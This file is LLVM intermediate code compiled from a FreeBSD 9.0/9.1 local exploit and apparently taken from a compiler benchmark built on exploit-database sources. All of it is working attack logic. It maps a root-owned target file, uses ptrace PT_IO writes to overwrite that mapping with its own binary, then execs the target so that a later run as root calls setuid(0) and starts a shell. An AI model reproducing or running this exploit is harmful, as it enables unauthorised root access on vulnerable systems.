; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_26368.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_26368.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64 }
%struct.ptrace_io_desc = type { i8*, i8*, i64, i32 }

@SH = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [37 x i8] c"FreeBSD 9.{0,1} mmap/ptrace exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"by Hunger <fbsd9lul@hunger.hu>\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@TG = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"stat\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@MAP_NOSYNC = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@PT_TRACE_ME = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [9 x i8] c"ptraceme\00", align 1
@PT_ATTACH = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [9 x i8] c"ptattach\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"wait\00", align 1
@PIOD_WRITE_D = common dso_local global i32 0, align 4
@PT_IO = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [5 x i8] c"ptio\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.stat, align 8
  %10 = alloca %struct.ptrace_io_desc, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i64 (...) @geteuid()
  %15 = icmp eq i64 %14, 0
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = call i32 @setuid(i32 0)
  %18 = load i8*, i8** @SH, align 8
  %19 = load i8*, i8** @SH, align 8
  %20 = call i32 @execl(i8* %18, i8* %19, i32* null)
  store i32 0, i32* %3, align 4
  br label %116

21:                                               ; preds = %2
  %22 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %23 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = load i32, i32* @O_RDONLY, align 4
  %28 = call i32 @open(i8* %26, i32 %27)
  store i32 %28, i32* %6, align 4
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %35, label %30

30:                                               ; preds = %21
  %31 = load i8*, i8** @TG, align 8
  %32 = load i32, i32* @O_RDONLY, align 4
  %33 = call i32 @open(i8* %31, i32 %32)
  store i32 %33, i32* %7, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %37

35:                                               ; preds = %30, %21
  %36 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  br label %37

37:                                               ; preds = %35, %30
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @stat(i8* %40, %struct.stat* %9)
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %45

43:                                               ; preds = %37
  %44 = call i32 @err(i32 2, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  br label %45

45:                                               ; preds = %43, %37
  %46 = getelementptr inbounds %struct.stat, %struct.stat* %9, i32 0, i32 0
  %47 = load i64, i64* %46, align 8
  %48 = load i32, i32* @PROT_READ, align 4
  %49 = load i32, i32* @MAP_SHARED, align 4
  %50 = load i32, i32* %6, align 4
  %51 = call i8* @mmap(i32* null, i64 %47, i32 %48, i32 %49, i32 %50, i32 0)
  store i8* %51, i8** %11, align 8
  %52 = load i8*, i8** @MAP_FAILED, align 8
  %53 = icmp eq i8* %51, %52
  br i1 %53, label %65, label %54

54:                                               ; preds = %45
  %55 = getelementptr inbounds %struct.stat, %struct.stat* %9, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = load i32, i32* @PROT_READ, align 4
  %58 = load i32, i32* @MAP_SHARED, align 4
  %59 = load i32, i32* @MAP_NOSYNC, align 4
  %60 = or i32 %58, %59
  %61 = load i32, i32* %7, align 4
  %62 = call i8* @mmap(i32* null, i64 %56, i32 %57, i32 %60, i32 %61, i32 0)
  store i8* %62, i8** %12, align 8
  %63 = load i8*, i8** @MAP_FAILED, align 8
  %64 = icmp eq i8* %62, %63
  br i1 %64, label %65, label %67

65:                                               ; preds = %54, %45
  %66 = call i32 @err(i32 3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  br label %67

67:                                               ; preds = %65, %54
  %68 = call i32 (...) @fork()
  store i32 %68, i32* %13, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %72

70:                                               ; preds = %67
  %71 = call i32 @err(i32 4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  br label %72

72:                                               ; preds = %70, %67
  %73 = load i32, i32* %13, align 4
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %83, label %75

75:                                               ; preds = %72
  %76 = load i32, i32* @PT_TRACE_ME, align 4
  %77 = load i32, i32* %13, align 4
  %78 = call i32 @ptrace(i32 %76, i32 %77, i32* null, i32 0)
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %82

80:                                               ; preds = %75
  %81 = call i32 @err(i32 5, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  br label %82

82:                                               ; preds = %80, %75
  store i32 0, i32* %3, align 4
  br label %116

83:                                               ; preds = %72
  %84 = load i32, i32* @PT_ATTACH, align 4
  %85 = load i32, i32* %13, align 4
  %86 = call i32 @ptrace(i32 %84, i32 %85, i32* null, i32 0)
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %90

88:                                               ; preds = %83
  %89 = call i32 @err(i32 6, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  br label %90

90:                                               ; preds = %88, %83
  %91 = call i32 @wait(i32* %8)
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %95

93:                                               ; preds = %90
  %94 = call i32 @err(i32 7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  br label %95

95:                                               ; preds = %93, %90
  %96 = load i32, i32* @PIOD_WRITE_D, align 4
  %97 = getelementptr inbounds %struct.ptrace_io_desc, %struct.ptrace_io_desc* %10, i32 0, i32 3
  store i32 %96, i32* %97, align 8
  %98 = load i8*, i8** %12, align 8
  %99 = getelementptr inbounds %struct.ptrace_io_desc, %struct.ptrace_io_desc* %10, i32 0, i32 0
  store i8* %98, i8** %99, align 8
  %100 = load i8*, i8** %11, align 8
  %101 = getelementptr inbounds %struct.ptrace_io_desc, %struct.ptrace_io_desc* %10, i32 0, i32 1
  store i8* %100, i8** %101, align 8
  %102 = getelementptr inbounds %struct.stat, %struct.stat* %9, i32 0, i32 0
  %103 = load i64, i64* %102, align 8
  %104 = getelementptr inbounds %struct.ptrace_io_desc, %struct.ptrace_io_desc* %10, i32 0, i32 2
  store i64 %103, i64* %104, align 8
  %105 = load i32, i32* @PT_IO, align 4
  %106 = load i32, i32* %13, align 4
  %107 = bitcast %struct.ptrace_io_desc* %10 to i32*
  %108 = call i32 @ptrace(i32 %105, i32 %106, i32* %107, i32 0)
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %112

110:                                              ; preds = %95
  %111 = call i32 @err(i32 8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0))
  br label %112

112:                                              ; preds = %110, %95
  %113 = load i8*, i8** @TG, align 8
  %114 = load i8*, i8** @TG, align 8
  %115 = call i32 @execl(i8* %113, i8* %114, i32* null)
  store i32 0, i32* %3, align 4
  br label %116

116:                                              ; preds = %112, %82, %16
  %117 = load i32, i32* %3, align 4
  ret i32 %117
}

declare dso_local i64 @geteuid(...) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i8* @mmap(i32*, i64, i32, i32, i32, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @ptrace(i32, i32, i32*, i32) #1

declare dso_local i32 @wait(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
